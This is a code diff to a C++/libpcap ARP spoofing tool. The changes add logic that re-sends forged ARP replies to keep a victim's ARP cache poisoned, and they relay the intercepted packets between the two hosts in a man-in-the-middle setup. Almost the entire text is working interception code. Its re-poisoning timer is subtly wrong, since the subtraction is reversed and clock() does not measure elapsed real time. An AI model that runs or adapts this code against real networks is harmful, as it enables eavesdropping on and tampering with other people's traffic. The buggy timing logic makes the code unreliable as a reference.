@@ -138,9 +138,9 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
 
   cout << "target_mac: " << string(target_mac) << " sender mac: " << string(sender_mac) << '\n';
   send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
-  
+  clock_t init = clock(); 
   while (true) {
-    clock_t start = clock();
+    clock_t start_loop = clock();
 
     struct pcap_pkthdr* header;
 		const u_char* packet;
@@ -150,6 +150,21 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			break;
 		}
+
+    EthArpPacket* recover_packet = (EthArpPacket*) packet;
+    // recover packet
+    if (recover_packet->eth_.type() == EthHdr::Arp && recover_packet->arp_.op() == ArpHdr::Request && recover_packet->arp_.tip() == target_ip) {
+      printf("poisoning arp again - arp received\n");
+      send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
+      continue;
+    } else if ((init - clock()) > 3000) {
+      // more than 3s, re poision arp table of sender
+      printf("poisoning arp again - time passed than 3times\n");
+      send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
+      init = clock();
+      continue;
+    }
+
     EthIpv4Packet* spoof_packet = (EthIpv4Packet*) packet;
     // sender -> me -> target
     if (spoof_packet->eth_.smac() == sender_mac && spoof_packet->eth_.dmac() == current_mac) {
@@ -166,7 +181,7 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
 	    if (res != 0) {
 		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	    } else {
-        printf("packet relayed with %d bytes, took %f times\n", header->caplen, (double)(clock() - start));
+        printf("packet relayed with %d bytes, took %f times\n", header->caplen, (double)(clock() - start_loop));
       }
     } else if (spoof_packet->eth_.smac() == target_mac && spoof_packet->eth_.dmac() == current_mac) {
       // target -> me -> sender
@@ -177,7 +192,7 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
 	      if (res != 0) {
 		      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	      } else {
-          printf("packet replyed with %d bytes, took %f times\n", header->caplen, (double)(clock() - start));
+          printf("packet replyed with %d bytes, took %f times\n", header->caplen, (double)(clock() - start_loop));
         }
       }
     }
